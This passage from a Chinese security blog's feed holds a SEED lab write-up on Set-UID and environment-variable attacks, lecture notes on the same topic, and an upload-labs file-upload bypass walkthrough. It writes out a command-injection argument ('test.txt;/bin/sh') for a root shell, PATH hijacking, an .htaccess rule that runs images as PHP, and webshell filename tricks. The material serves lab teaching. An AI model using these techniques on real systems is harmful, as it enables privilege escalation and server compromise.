aria-hidden="true">image-20231025095731936</figcaption></figure></li><li><p>执行程序，成功执行了我们自定义的ls命令。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015255.png"alt="image-20231025095755860" /><figcaption aria-hidden="true">image-20231025095755860</figcaption></figure></li><li><p>获取具有root权限的shell: 将/bin/sh拷贝为/home/seed目录下的ls，执行程序，成功得到root权限的shell.因为执行Set-UID程序时，会临时获得root权限，所以得到的是root权限的shell.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015256.png"alt="image-20231025095816376" /><figcaption aria-hidden="true">image-20231025095816376</figcaption></figure></li><li><p><strong>结论：与system()相比，execve()的攻击面更小.execve()不调用shell，因此不受环境变量的影响。当在特权程序中调用外部程序时，我们应该使用execve()。</strong></p></li></ol><h2id="task-7-the-ld-preload-environment-variable-and-set-uid-programs">2.7Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h2><p>在本任务中，我们将研究 Set-UID程序如何处理某些环境变量。一些环境变量（包括<code>LD_PRELOAD</code>、<code>LD_LIBRARY_PATH</code>和其他<code>LD_*</code>）会影响动态加载器/链接器的行为。动态加载器/链接器是操作系统（OS）的一部分，它在运行时加载（从持久存储到RAM）和链接可执行文件所需的共享库。</p><p>在 Linux 中，<code>ld.so</code>或<code>ld-linux.so</code>是动态加载器/链接器（分别用于不同类型的二进制文件）。在影响其行为的环境变量中，<code>LD_LIBRARY_PATH</code>和<code>LD_PRELOAD</code>是本实验室所关注的两个变量。在Linux中，<code>LD_LIBRARY_PATH</code>是一组以冒号分隔的目录，应首先在这些目录中搜索库，然后再搜索标准目录集。<code>LD_PRELOAD</code>指定了一个额外的、用户指定的共享库列表，这些共享库将在所有其他共享库之前加载。在本任务中，我们将只研究<code>LD_PRELOAD</code>。</p><p><strong>步骤1</strong>：首先，我们将了解这些环境变量在运行普通程序时如何影响动态加载器/链接器的行为。请按照以下步骤操作：</p><ol type="1"><li><p>让我们建立一个动态链接库。创建以下程序，并将其命名为mylib.c。它基本上覆盖了 libc 中的 sleep() 函数：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553574.png"alt="image-20231208153026204" /><figcaption aria-hidden="true">image-20231208153026204</figcaption></figure></li><li><p>我们可以使用以下命令编译上述程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gcc -fPIC -g -c mylib.c<br>$ gcc -shared -o libmylib.so.1.0.1 mylib.o -lc<br></code></pre></td></tr></table></figure></li><li><p>现在，设置 <code>LD_PRELOAD</code>环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> LD_PRELOAD=./libmylib.so.1.0.1<br></code></pre></td></tr></table></figure></li><li><p>最后，编译下面的程序 myprog，并与上述动态链接库 libmylib.so.1.0.1放在同一目录下：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553576.png"alt="image-20231208153200712" /><figcaption aria-hidden="true">image-20231208153200712</figcaption></figure></li></ol><p><strong>步骤 2</strong>：完成上述操作后，请在以下条件下运行myprog，并观察结果。</p><ul><li>将 myprog 设置为普通程序，并以普通用户身份运行。</li><li>将 myprog 设为 Set-UID root 程序，并以普通用户身份运行。</li><li>将 myprog 设置为 Set-UID root 程序，在 root 账户中再次导出<code>LD_PRELOAD</code>环境变量并运行它。</li><li>将 myprog 设置为 Set-UID user1 程序（即所有者为user1，也就是另一个用户账户），在另一个用户账户（非根用户）中再次导出<code>LD_PRELOAD</code>环境变量并运行。</li></ul><p><strong>步骤3</strong>：即使运行的是同一个程序，您也应该能在上述场景中观察到不同的行为。你需要找出造成这种差异的原因。环境变量在这里起了作用。请设计一个实验来找出主要原因，并解释为什么步骤2 中的行为不同。(提示：子进程可能不会继承 LD * 环境变量）。</p><p><strong>实验流程：</strong></p><ol type="1"><li>建立一个动态链接库。创建以下程序，并将其命名为 mylib.c，用于覆盖libc 中的 sleep() 函数。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015257.png"alt="image-20231025100014757" /><figcaption aria-hidden="true">image-20231025100014757</figcaption></figure><ol start="2" type="1"><li><p>编译上述程序</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015258.png"alt="image-20231025100035694" /><figcaption aria-hidden="true">image-20231025100035694</figcaption></figure></li><li><p>设置<code>LD_PRELOAD</code>环境变量</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015259.png"alt="image-20231025100100645" /><figcaption aria-hidden="true">image-20231025100100645</figcaption></figure></li><li><p>创建并编译myprog.c</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015260.png"alt="image-20231025100118206" /><figcaption aria-hidden="true">image-20231025100118206</figcaption></figure></li><li><p>运行程序</p><ul><li><p>将 myprog 设为普通程序，并以普通用户身份运行。成功打印<code>LD_PRELOAD</code>环境变量，执行自定义函数，说明环境变量生效。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015261.png"alt="image-20231025100244606" /><figcaption aria-hidden="true">image-20231025100244606</figcaption></figure></li><li><p>将 myprog 设为 Set-UID root程序，并以普通用户身份运行。没有打印<code>LD_PRELOAD</code>环境变量，程序睡眠一秒，说明该环境变量被忽略。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015262.png"alt="image-20231025100251936" /><figcaption aria-hidden="true">image-20231025100251936</figcaption></figure></li><li><p>将 myprog 设置为 Set-UID root 程序，在 root账户中再次导出<code>LD_PRELOAD</code>环境变量，然后运行它。成功打印<code>LD_PRELOAD</code>环境变量，执行自定义函数，说明环境变量生效。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015263.png"alt="image-20231025100258347" /><figcaption aria-hidden="true">image-20231025100258347</figcaption></figure></li><li><p>将 myprog 设置为 Set-UID xukaiyu 程序（即所有者为xukaiyu，也就是另一个用户账户）、在另一个用户账户（seed）中再次导出<code>LD_PRELOAD</code>环境变量，然后运行它。没有打印<code>LD_PRELOAD</code>环境变量，程序睡眠一秒，说明该环境变量被忽略。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015264.png"alt="image-20231025100306718" /><figcaption aria-hidden="true">image-20231025100306718</figcaption></figure></li></ul></li><li><p><strong>结论：只有EUID和RUID相同时，<code>LD_PRELOAD</code>环境变量才能生效。也就是说，只有用户自己创建的程序自己去运行，才会使用<code>LD_PRELOAD</code>环境变量，重载sleep函数，否则的话会忽略<code>LD_PRELOAD</code>环境变量，不会重载sleep函数。</strong></p></li></ol><h2id="task-8-invoking-external-programs-using-system-versus-execve">2.8Task 8: Invoking External Programs Using system() versus execve()</h2><p>虽然 system() 和 execve() 都可以用来运行新程序，但如果在特权程序（如Set-UID 程序）中使用 system()，就会非常危险。我们已经看到 PATH环境变量如何影响 system() 的行为，因为该变量会影响 shell的工作方式。execve() 不存在这个问题，因为它不调用 shell。调用 shell会带来另一个危险的后果，而这一次，它与环境变量无关。让我们看看下面的情况。</p><p>鲍勃在一家审计机构工作，他需要调查一家公司的欺诈嫌疑。为了达到调查目的，鲍勃需要能够读取该公司Unix系统中的所有文件；另一方面，为了保护系统的完整性，鲍勃不能修改任何文件。为了实现这一目标，系统的超级用户文斯编写了一个特殊的set-root-uid程序（见下文），然后将可执行权限交给了鲍勃。该程序要求鲍勃在命令行键入一个文件名，然后运行/bin/cat 显示指定文件。由于程序是以根用户身份运行的，因此可以显示 Bob指定的任何文件。但是，由于该程序没有写入操作，所以 Vince 非常确定 Bob不能使用这个特殊程序修改任何文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553577.png"alt="image-20231208154126215" /><figcaption aria-hidden="true">image-20231208154126215</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553578.png"alt="image-20231208154133781" /><figcaption aria-hidden="true">image-20231208154133781</figcaption></figure><p><strong>步骤 1</strong>：编译上述程序，使其成为根用户所有的 Set-UID程序。程序将使用 system()调用命令。如果你是鲍勃，你能破坏系统的完整性吗？例如，你能删除一个你无法写入的文件吗？</p><p><strong>步骤 2</strong>：注释掉 system(command) 语句，取消对 execve()语句的注释；程序将使用 execve() 调用命令。编译程序，使其成为根用户的Set-UID。步骤 1 中的攻击还有效吗？请描述并解释你的观察结果。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>编译catall.c，使其成为根用户所有的 Set-UID 程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015265.png"alt="image-20231025100352901" /><figcaption aria-hidden="true">image-20231025100352901</figcaption></figure></li><li><p>切换到root用户，创建test.txt文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015266.png"alt="image-20231025100414003" /><figcaption aria-hidden="true">image-20231025100414003</figcaption></figure></li><li><p>切换回seed用户。直接删除test.txt文件，无法成功。通过catall程序进行删除，命令参数为“test.txt;/bin/sh”，先得到一个root权限的shell，再进行删除操作。注：要同时在命令行执行两个命令，可以用”;”来进行分割。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015267.png"alt="image-20231025100445291" /><figcaption aria-hidden="true">image-20231025100445291</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015268.png"alt="image-20231025100451817" /><figcaption aria-hidden="true">image-20231025100451817</figcaption></figure></li><li><p>注释掉 system(command) 语句，取消对 execve()语句的注释；程序将使用 execve()调用命令。编译程序，并将其作为根用户所有的 Set-UID 程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015269.png"alt="image-20231025100526231" /><figcaption aria-hidden="true">image-20231025100526231</figcaption></figure></li><li><p>再次进行前面步骤中的攻击，发现无法得到一个root权限的shell，从而不能成功攻击。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015270.png"alt="image-20231025100542023" /><figcaption aria-hidden="true">image-20231025100542023</figcaption></figure></li></ol><h2 id="task-9-capability-leaking">2.9 Task 9: Capability Leaking</h2><p>为了遵循 "最小权限原则"，如果不再需要根权限，Set-UID程序通常会永久放弃根权限。此外，有时程序需要将控制权移交给用户；在这种情况下，必须撤销root 权限。setuid()系统调用可用于撤销权限。根据手册，"setuid()设置调用进程的有效用户 ID。如果调用者的有效 UID 是 root，则实际 UID和保存的 set-user-ID 也会被设置"。因此，如果一个有效 UID 为 0 的 Set-UID程序调用 setuid(n)，该进程将成为一个正常进程，其所有 UID 都被设置为n。</p><p>在撤销权限时，常见错误之一是能力泄露。换句话说，虽然进程的有效用户 ID变成了非特权用户，但进程仍然是特权进程，因为它拥有特权能力。</p><p>编译以下程序，将其所有者改为 root，并使其成为 Set-UID程序。以普通用户身份运行该程序。你能利用该程序中的能力泄露漏洞吗？目标是以普通用户身份写入/etc/zzz 文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553579.png"alt="image-20231208154713936" /><figcaption aria-hidden="true">image-20231208154713936</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312081553580.png"alt="image-20231208154724054" /><figcaption aria-hidden="true">image-20231208154724054</figcaption></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>以管理员身份创建文件/etc/zzz，该文件普通用户无写权限。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015271.png"alt="image-20231025100646131" /><figcaption aria-hidden="true">image-20231025100646131</figcaption></figure></li><li><p>编译cap leak.c，将其所有者改为 root，并使其成为 Set-UID程序。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015272.png"alt="image-20231025100619844" /><figcaption aria-hidden="true">image-20231025100619844</figcaption></figure></li><li><p>虽然代码中调用了setuid(getuid())，试图降低特权，但并没有完全清除特权。程序打开文件后并没有关闭文件，并且输出了文件描述符，所以我们仍然可以成功写/etc/zzz。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251015273.png"alt="image-20231025100714076" /><figcaption aria-hidden="true">image-20231025100714076</figcaption></figure></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/29/网络攻防-环境变量攻击/#Task9">网络攻防-环境变量攻击- Sean's Blog (seanxz401.github.io)</a></li><li><ahref="https://gls.show/p/c51248f4/#Task-9-Capability-Leaking">SEED-lab：EnvironmentVariable and Set-UID Program Lab - 郭佳明的博客 (gls.show)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Software Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH4-软件漏洞-环境变量</title>
    <link href="/2023/10/25/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    <url>/2023/10/25/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/04%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识">1. 基础知识</h1><h2 id="环境变量">1.1 环境变量</h2><ul><li>一组动态的定义值</li><li>操作系统运行环境的一部分</li><li>影响正在运行进程的行为方式（加载哪些外部DLL）</li><li>在Unix中提出，也被微软操作系统采用</li><li>示例：PATH变量.当执行一个程序时，如果没有提供完整的路径，shell进程将使用环境变量来找到程序的位置.</li></ul><h2 id="环境变量的内存位置">1.2 环境变量的内存位置</h2><ul><li><p>envp和environ最初指向同一个地方</p></li><li><p>envp只能在主函数中可访问，而 environ 是一个全局变量</p></li><li><p>当对环境变量进行更改时（例如添加新变量），存储环境变量的位置可能会移动到堆中，因此environ将发生更改（envp不会更改）</p></li><li><p>添加或删除环境变量或修改现有变量的值，1和2中没有足够的空间。在这种情况下，整个环境变量块可能会更改到不同的位置（通常是在堆中）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937981.png"alt="image-20231025085558964" /><figcaption aria-hidden="true">image-20231025085558964</figcaption></figure></li></ul><h2 id="c语言访问环境变量">1.3 C语言访问环境变量</h2><ol type="1"><li>从主函数中访问：<code>void main(int argc, char* argv[], char* envp[])</code></li><li>使用全局变量：<code>extern char** environ</code></li></ol><h2 id="进程获取环境变量">1.4 进程获取环境变量</h2><ol type="1"><li>如果使用<code>fork()</code>创建了一个新进程，子进程继承父进程的环境变量</li><li>如果进程使用<code>execve()</code>启动一个新程序，在此场景中内存空间被覆盖，所有旧环境变量将丢失.通过参数<code>envp</code>传递环境变量<code>int execve(const char* filename, char* const argv[], char* const envp[])</code></li></ol><h2 id="shell命令变量和环境变量">1.5 shell命令变量和环境变量</h2><ul><li><p>shell命令变量和环境变量不相同</p></li><li><p>shell命令变量是shell使用的内部变量.shell提供了内置命令，允许用户创建、分配和删除Shell变量</p></li><li><p>当shell程序启动时，它会将环境变量复制到自己的shell变量中.shell变量所做的更改将不会反映出在环境变量上.但是exported后的shell变量可以传到子进程.</p></li><li><p>当我们在shell提示符中输入env时，shell将创建一个子进程</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937982.png"alt="image-20231025090223045" /><figcaption aria-hidden="true">image-20231025090223045</figcaption></figure></li></ul><h2 id="set-uid">1.6 Set-UID</h2><ul><li>Set-UID 是 Unix 操作系统中的一种重要安全机制.当 Set-UID程序运行时，它将拥有所有者的权限.例如，如果程序的所有者是root，那么当任何人运行该程序在执行过程中就会获得 root 的权限.</li><li>设置后效果：原本表示文件所有者权限中的 x 权限位，却出现了 s权限，此种权限通常称为 SetUID，简称 SUID 特殊权限</li><li>每个进程都有两个用户ID<ul><li>Real UID (RUID):确定进程的真正所有者</li><li>Effective UID (EUID): 标识进程的权限</li></ul></li><li>当执行正常程序时 , RUID = EUID,它们都等于运行程序的用户的ID；当执行Set-UID时, RUID ≠ EUID.RUID还是运行程序的用户 ID, 但是 EUID 是程序 owner的 ID.</li></ul><h1 id="环境变量攻击">2. 环境变量攻击</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937983.png"alt="image-20231025090642033" /><figcaption aria-hidden="true">image-20231025090642033</figcaption></figure><h2 id="通过动态链接器攻击">2.1 通过动态链接器攻击</h2><ul><li><p>静态链接：包含程序代码和涉及的外部库的代码（编译出的程序较大）</p></li><li><p>动态链接：在运行使用动态链接编译的程序之前，首先将其可执行文件加载到内存.加载到内存中后，加载器将控制件传递给动态链接器，链接器为共享库找到外部库的实现.一旦链接完成，控制将提供给main()</p></li><li><p>可以使用<code>ldd</code>命令来查看程序依赖于什么共享库</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937984.png"alt="image-20231025091306026" /><figcaption aria-hidden="true">image-20231025091306026</figcaption></figure></li></ul><p><strong>攻击方式：</strong></p><ul><li>LD_PRELOAD 包含一个共享库的列表，链接器将首先搜索它；</li><li>如果没有找到所有函数，链接器将在几个文件夹列表中搜索，包括LD_LIBRARY_PATH指定的文件夹；</li><li>这两个变量都可以由用户设置，因此使他们有机会控制链接过程结果.例：用户创建一个共享库(如实现自己的sleep函数)，并将共享库添加到LD_PRELOAD环境变量首位.执行调用sleep函数的程序时，执行的sleep函数为用户自定义的函数.</li><li>如果该程序是一个Set-UID程序，它可能会导致安全漏洞.当EUID≠RUID时，动态链接器会忽略LD_PRELOAD和LD_LIBRARY_PATH</li></ul><h2 id="通过外部程序攻击">2.2 通过外部程序攻击</h2><ul><li><p>应用程序可以调用外部程序.应用程序本身可能不使用环境变量，但被调用的外部程序可能会使用.</p></li><li><p>调用外部程序：</p><ul><li>exec()函数家族，它们以不同的形式调用execve，直接运行程序.</li><li>system()，先调用execl()，execl()最终调用execve()运行/bin/sh，然后通过shell运行程序.shell程序会继承环境变量.</li></ul></li><li><p>操作PATH变量进行攻击：shell运行命令而没有提供绝对路径时，它将使用PATH变量来找到该命令.</p></li><li><p>例：正常的程序(vul.c)中存在<code>system("cal");</code>，通过操作路径变量，使shell将cal命令定位到自定义的cal程序(攻击者可在这个程序中继承环境变量，以root权限执行其他命令)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chown</span> root vul.o<br>sudo <span class="hljs-built_in">chmod</span> 4755 vul.o<br>gcc cal.c -o cal<br><span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><span class="hljs-comment"># 将当前路径添加到PATH变量中</span><br>./vul.o<br></code></pre></td></tr></table></figure></li><li><p>当在特权程序中调用外部程序时，应该使用execve()，不调用shell，因此不受环境变量的影响.</p></li></ul><h2 id="通过外部库攻击">2.3 通过外部库攻击</h2><p>程序通常使用来自外部库的函数。如果这些函数使用环境变量，则它们会添加到攻击表面.</p><h2 id="通过应用程序代码攻击">2.4 通过应用程序代码攻击</h2><ul><li>程序可以直接使用环境变量。如果这些是特权程序，它可能会导致不可信任的输入.</li><li>当从shell执行命令时，将创建一个新的进程.shell使用shell变量设置这个新进程的环境变量PWD.因此，该值可以被用户篡改.如果这个程序是一个Set-UID，用户可以通过将PWD变量设置为一个任意的长字符串来利用它.攻击者可以进一步利用缓冲区溢出来获得特权.</li></ul><h2 id="服务方法">2.5 服务方法</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937985.png"alt="image-20231025093450923" /><figcaption aria-hidden="true">image-20231025093450923</figcaption></figure><ul><li>Set-UID方法：普通用户必须运行一个特殊的程序才能临时获得根权限.不能信任环境变量.</li><li>服务方法：普通用户必须请求特权服务才能为他们执行操作.可以信任环境变量.</li><li>从功能的角度来看，Set-UID的性能更好。这是因为它不需要一个正在运行的后台进程；从安全的角度来看，Set-UID方法具有更广泛的攻击面.</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2023/10/23/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/upload-labs/"/>
    <url>/2023/10/23/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/upload-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">引言</h1><p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场.旨在帮助大家对上传漏洞有一个全面的了解.目前一共20关，每一关都包含着不同上传方式.</p><p><strong>注意：</strong></p><p>每一关没有固定的通关方法，大家不要自限思维！</p><p><strong>漏洞类型分类</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251547692.png"alt="image-20231023135621979" /><figcaption aria-hidden="true">image-20231023135621979</figcaption></figure><p><strong>如何判断上传漏洞</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251549661.png"alt="image-20231023135738427" /><figcaption aria-hidden="true">image-20231023135738427</figcaption></figure><h1 id="pass-01">Pass-01</h1><ul><li>提示：在客户端使用js对不合法图片进行检查</li><li>绕过方法：<ul><li>禁用JavaScript</li><li>先将webshell修改为合法后缀，上传过程中使用burp抓包拦截，修改后缀为php</li></ul></li></ul><h1 id="pass-02">Pass-02</h1><ul><li>提示：在服务端对数据包的MIME进行检查</li><li>绕过方法：利用burp抓包修改webshell的Content-Type为服务器允许的类型</li><li>媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME类型）是一种标准，用来表示文档、文件或字节流的性质和格式</li></ul><table><thead><tr class="header"><th style="text-align: left;">类型</th><th style="text-align: left;">描述</th><th style="text-align: left;">典型示例</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>text</code></td><td style="text-align: left;">表明文件是普通文本，理论上是人类可读</td><td style="text-align: left;"><code>text/plain</code>,<code>text/html</code>, <code>text/css, text/javascript</code></td></tr><tr class="even"><td style="text-align: left;"><code>image</code></td><tdstyle="text-align: left;">表明是某种图像.不包括视频，但是动态图（比如动态gif）也使用image类型</td><td style="text-align: left;"><code>image/gif</code>,<code>image/png</code>, <code>image/jpeg</code>, <code>image/bmp</code>,<code>image/webp</code>, <code>image/x-icon</code>,<code>image/vnd.microsoft.icon</code></td></tr><tr class="odd"><td style="text-align: left;"><code>audio</code></td><td style="text-align: left;">表明是某种音频文件</td><td style="text-align: left;"><code>audio/midi</code>,<code>audio/mpeg, audio/webm, audio/ogg, audio/wav</code></td></tr><tr class="even"><td style="text-align: left;"><code>video</code></td><td style="text-align: left;">表明是某种视频文件</td><td style="text-align: left;"><code>video/webm</code>,<code>video/ogg</code></td></tr><tr class="odd"><td style="text-align: left;"><code>application</code></td><td style="text-align: left;">表明是某种二进制数据</td><td style="text-align: left;"><code>application/octet-stream</code>,<code>application/pkcs12</code>,<code>application/vnd.mspowerpoint</code>,<code>application/xhtml+xml</code>, <code>application/xml</code>,<code>application/pdf</code></td></tr></tbody></table><h1 id="pass-03">Pass-03</h1><ul><li>提示：禁止上传<code>.asp|.aspx|.php|.jsp</code>后缀文件</li><li>绕过方法：<ul><li>使用php文件其它扩展名：<code>.phtml .phps .php5 .pht</code>.可以成功上传，但没有作为php代码执行，这与中间件对于文件类型的解析规则有关.</li><li>构造<code>::$DATA</code>.例：<code>shell.php::$DA::$DATATA</code>.</li></ul></li><li>Windows保存文件过程中如果出现文件名+<code>::$DATA</code>，会认<code>::$DATA</code>是NTFS文件流的一部分，将其清除.例如：<code>phpinfo.php::$DATA</code>,Windows会自动去掉末尾的<code>::$DATA</code>使其变成<code>phpinfo.php</code>.</li></ul><h1 id="pass-04">Pass-04</h1><ul><li><p>提示：禁止上传<code>.php|.php5|.php4|.php3|……</code>后缀文件</p></li><li><p>绕过方法：先上传一个<code>.htaccess</code>配置文件，增添解析规则，再上传webshell.可以成功上传，但没有生效，这与中间件的配置文件有关.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;shell.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure></li><li><p><code>.htaccess</code>基础知识：<code>.htaccess</code>可以帮我们实现：文件夹密码保护、用户自动重定向、自定义错误页面、改变文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能.<code>.htaccess</code>文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效.</p></li></ul><h1 id="pass-05">Pass-05</h1><ul><li>提示：禁止上传<code>.php|.php5|.php4|.php3|……|.htaccess</code>后缀文件</li><li>绕过方法：大小写绕过，修改后缀为<code>PHP</code>即可</li></ul><h1 id="pass-06">Pass-06</h1><ul><li>提示：禁止上传<code>.php|.php5|.php4|.php3|……</code>后缀文件</li><li>绕过方法：<ul><li>空格绕过：文件末尾加空格</li><li>构造<code>::$DATA</code></li></ul></li><li>空格绕过原理：window 操作系统保存文件过程中空格会被作为空处理</li></ul><h1 id="pass-07">Pass-07</h1><ul><li>提示：禁止上传所有可以解析的后缀！</li><li>绕过方法：点绕过：文件末尾加<code>.</code>若不成功，可以加<code>..</code>(php版本问题)</li><li>点绕过原理：window操作系统保存文件过程中文件后缀名末尾的点会被自动去除</li></ul><h1 id="pass-08">Pass-08</h1><ul><li>提示：禁止上传<code>.php|.php5|.php4|.php3|……|.htaccess</code>后缀文件</li><li>绕过方法：::<spanclass="math inline">\(DATA绕过.例：`shell.php::\)</span>DATATA`</li></ul><h1 id="pass-09">Pass-09</h1><ul><li>提示：只允许上传<code>.jpg|.png|.gif</code>后缀的文件</li><li>绕过方法：构造<code>shell.php. .</code></li><li>原理：deldot()从字符串的尾部开始，从后向前删除点<code>.</code>，直到该字符串的末尾字符不是<code>.</code>为止.加上它没有进行循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次.</li></ul><h1 id="pass-10">Pass-10</h1><ul><li>提示：会从文件名中去除<code>.php|.php5|.php4|.php3|......|.htaccess</code>字符</li><li>绕过方法：源码中对非法后缀进行了替换，但只替换了一次，构造<code>shell.pphphp</code></li></ul><h1 id="pass-11">Pass-11</h1><ul><li>提示：上传路径可控</li><li>绕过方法：使用%00截断，构造<code>shell.php%00</code>，同时修改shell为合法后缀</li><li>原理：00 截断是操作系统层的漏洞，由于操作系统是 C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0作为字符串的结尾.</li></ul><h1 id="pass-12">Pass-12</h1><ul><li>提示：上传路径可控</li><li>绕过方法：使用%00截断，但接收值变成了 post,区别就是 get会自行解码，post 不会自行解码，因此我们需要对%00 进行url解码</li></ul><h1 id="pass-13">Pass-13</h1><ul><li>提示：检查图标内容开头2个字节</li><li>绕过方法：图片马+文件包含漏洞</li><li>图片马制作：<code>copy picName.jpg /b + shellName.php /a webshell.jpg</code></li></ul><h1 id="pass-14">Pass-14</h1><ul><li>提示：使用getimagesize()检查是否为图片文件</li><li>绕过方法：图片马+文件包含漏洞</li><li>getimagesize()：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</li></ul><h1 id="pass-15">Pass-15</h1><ul><li>提示：使用exif_imagetype()检查是否为图片文件</li><li>绕过方法：图片马+文件包含漏洞</li><li>exif_imagetype()：读取一个图像的第一个字节并检查其签名，如果发现了恰当的签名则返回一个对应的常量，否则返回FALSE.</li></ul><h1 id="pass-16">Pass-16</h1><ul><li>提示：重新渲染了图片</li><li>绕过方法：把一句话木马插入到图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉</li><li>二次渲染原理：在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示.<strong>判断是否经过二次渲染</strong>：对比要上传图片与上传后的图片大小</li></ul><h1 id="pass-17">Pass-17</h1><ul><li>提示：需要代码审计</li><li>绕过方法：条件竞争(需要burp专业版).审计代码发现服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名.如果不符合的话，unlink()函数就会删除该文件.</li><li>条件竞争原理：当我们成功上传了php文件，服务端会在短时间内将其删除，我们需要抢在它删除之前访问文件并生成一句话木马文件，所以访问包的线程需要大于上传包的线程（均为较大值，如500）.</li></ul><h1 id="pass-18">Pass-18</h1><ul><li>提示：需要代码审计</li><li>绕过方法：条件竞争.从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在.文件上传之后又对其进行了重命名.</li></ul><h1 